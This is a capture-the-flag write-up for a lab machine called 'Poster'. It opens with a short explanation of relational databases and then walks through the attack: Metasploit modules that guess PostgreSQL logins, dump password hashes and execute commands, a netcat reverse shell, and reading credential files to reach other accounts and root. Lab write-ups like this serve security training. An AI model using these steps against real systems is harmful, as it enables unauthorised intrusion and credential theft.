# Poster

### Task 1

What is rdbms?

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, severla companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat fle stores data in a single table structure, making it less efficient and consuming more space and memory. 

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, delete), which are critical to support consistent data management. 

*What is the rdbms installed on the server?*

Nmap scan to get port 5432 - postgresql

Ans: postgresql

*What port is the rdbms running on?*

Ans: 5432

*After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?*

To search for exploits:

msfconsole

search postgresql

Ans: auxiliary/scanner/postgres/postgres_login

*What are the credentials you found?*

use auxiliary/scanner/postgres/postgres_login

set RHOSTS 10.10.90.79

run

Ans: postgres:password

*What is the full path of the module that allows you to execute commands with the proper user credentials?*

Ans: auxiliary/admin/postgres/postgres_sql

*Based on the results of #6, what is the rdbms version installed on the server?*

use auxiliary/admin/postgres/postgres_sql

set USERNAME postgres

set PASSWORD password

run

Ans: 9.5.21

*What is the full path of the module that allows for dumping user hashes?*

Ans: auxiliary/scanner/postgres/postgres_hashdump

*How many user hashes does the module dump?*

Ans: 6

*What is the full path of the module that allows an authenticated user to view files of their choosing on the server?*

Ans: auxiliary/admin/postgres/postgres_readfile

*What is the full path of the module that allows arbitrary command execution with the proper user credentials?*

Ans: exploit/multi/postgres/postgres_copy_from_program_cmd_exec

*Compromise the machine and locate user.txt*

Run the exploit from above, before that, start a netcat listener. After getting the shell, we see that user.txt is inside /home/alison, but we can't cat the file. Instead, going into /home/dark, we find a credentails.txt file with credentials for a user named dark. SSH into the machine with that credentials. Going to /var/www/html ew can read the config.php file that contains the credentials for alison. SSH into that, then cat the user.txt file. 

Ans: Flag found in alison's machine. 

*Escalate privileges and obtain root.txt*

Running sudo -l inside alison's machine we see that alison is allowed (ALL : ALL) ALL. 

(ALL : ALL) means that members of the group can execute all commands for each user and each group on the system.

sudo bash 

cat /root/root.txt

Ans: Flag found